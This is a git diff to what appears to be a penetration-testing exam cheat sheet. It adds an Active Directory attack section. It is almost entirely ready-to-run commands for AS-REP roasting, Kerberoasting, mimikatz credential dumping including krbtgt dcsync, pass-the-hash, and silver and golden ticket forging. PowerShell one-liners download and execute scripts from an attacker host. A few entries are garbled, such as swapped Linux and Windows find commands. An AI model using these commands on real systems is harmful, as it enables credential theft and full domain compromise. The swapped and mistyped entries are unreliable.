@@ -215,8 +215,8 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Ne
 
 |   |   |
 |---|---|
-|Username/password|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`|
-|Password hashes|`evil-winrm -i #TARGET -u $USERNAME -H $NT_HASH`|
+|Username/password|`evil-winrm -i $TARGET -u $USERNAME -p $PASSWORD`|
+|Password hashes|`evil-winrm -i $TARGET -u $USERNAME -H $NT_HASH`|
 
 #### impacket-psexec
 
@@ -417,17 +417,109 @@ https://github.com/carlospolop/PEASS-ng/releases
 
 ## 8. Active Directory
 
-AS-REP Roasting
+### 8.1. [AS-REP roasting](/attacking-active-directory.md#1-as-rep-roasting)
 
-mimikatz lsadump::sam, lsadump::lsa /patch, sekurlsa::logonpasswords
+|   |   |
+|---|---|
+|Install [kerbrute](https://github.com/TarlogicSecurity/kerbrute)|`pip3 install kerbrute`|
+|Find users with preauthentication disabled|`kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $DOMAIN -dc-ip $DC_IP`|
+|Use GetNPUsers.py to get password hashes|`impacket-GetNPUsers $DOMAIN/$USERNAME -no-pass -dc-ip $DC_IP`|
+|Use hashcat to crack the hashes|`hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt`|
+|Connec to target|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`<br>`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
 
-Pass the hash: evil-winrm, impacket-psexec
+### 8.2. [Password dumping](/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)
 
-Kerberoasting
+Preparing:
 
-Golden Ticket
+|   |   |
+|---|---|
+|`mimikatz`|`cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html`|
+|`Invoke-Mimikatz`|`curl -o /var/www/html/Invoke-Mimikatz.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1`|
+
+Executing:
+
+```console
+mimikatz.exe "privilege::debug token::elevate lsadump::sam exit"
+mimikatz.exe "privilege::debug token::elevate lsadump::secrets exit"
+mimikatz.exe "privilege::debug token::elevate lsadump::cache exit"
+mimikatz.exe "privilege::debug token::elevate sekurlsa::logonpasswords exit"
+mimikatz.exe "privilege::debug token::elevate vault::cred /patch exit"
+mimikatz.exe "privilege::debug token::elevate lsadump::dcsync /user:domain\krbtgt /domain:$DOMAIN exit"
+powershell.exe iex (New-Object Net.WebClient).DownloadString('http://$KALI/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
+```
+
+### 8.3. [Pass the hash](/attacking-active-directory.md#3-pass-the-hash)
+
+|   |   |
+|---|---|
+|evil-winrm|`evil-winrm -i $TARGET -u $USERNAME -H $NT_HASH`|
+|impacket-psexec|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|
+|pth-winexe|`pth-winexe -U [$DOMAIN/]$USERNAME%$LM_HASH:$NT_HASH //TARGET cmd.exe`|
+|sekurlsa::pth + PsExec|`sekurlsa::pth /user:domainadmin /domain:$DOMAINx /ntlm:$NT_HASH`<br>`PsExec \\$TARGET cmd.exe`|
+
+### 8.4. [Kerberoasting](/attacking-active-directory.md#42-kerberoasting)
+
+Option 1: `Invoke-Kerberoast.ps1`
+
+|   |   |
+|---|---|
+|Prepare file on Kali|`cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 /var/www/html`|
+|Execute on target|`powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"`|
+
+Option 2: `impacket-GetUserSPNs`
+
+```console
+impacket-GetUserSPNs $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP -outputfile tgs.hash
+```
+
+Cracking service account hash using hashcat
+
+```console
+hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
+```
+
+### 8.5. Getting tickets
+
+#### [Silver ticket](/attacking-active-directory.md#43-silver-ticket)
+
+```cmd
+whoami /user
+mimikatz # kerberos::hash /password:$SERVICE_ACCOUNT_PASSWORD
+mimikatz # kerberos::purge
+mimikatz # kerberos::golden /user:$USERNAME /domain:$DOMAIN /sid:$DOMAIN_SID /id:$USER_SID /target:$TARGET /service:$SERVICE /rc4:$SERVICE_ACCOUNT_PASSWORD_HASH /ptt
+```
+
+#### [Golden ticket](/attacking-active-directory.md#5-golden-ticket)
+
+Option 1: `impacket`
+
+```console
+impacket-secretsdump -hashes $LM_HASH:$NT_HASH $DOMAIN/$USERNAME@$TARGET
+impacket-lookupsid -hashes $LM_HASH:$NT_HASH $DOMAIN/$USERNAME@$TARGET
+impacket-ticketer -nthash $KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN administrator
+impacket-psexec $DOMAIN/administrator@$TARGET -k -no-pass -target-ip $TARGET_IP -dc-ip $DC_IP
+```
+
+Option 2: `mimikatz`
+
+```cmd
+whoami /user
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch
+mimikatz # kerberos::purge
+mimikatz # kerberos::golden /user:administrator /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:KRBTGT_NT_HASH /ptt
+mimikatz # misc::cmd
+PsExec.exe \\$TARGET cmd.exe
+```
 
 ## 9. Exam proofs
+
+Finding:
+
+|OS|Command|
+|---|---|
+|Linux|`dir /S *proof.txt`|
+|Windows|`find / -name proof.txt`|
 
 |OS|Command|
 |---|---|
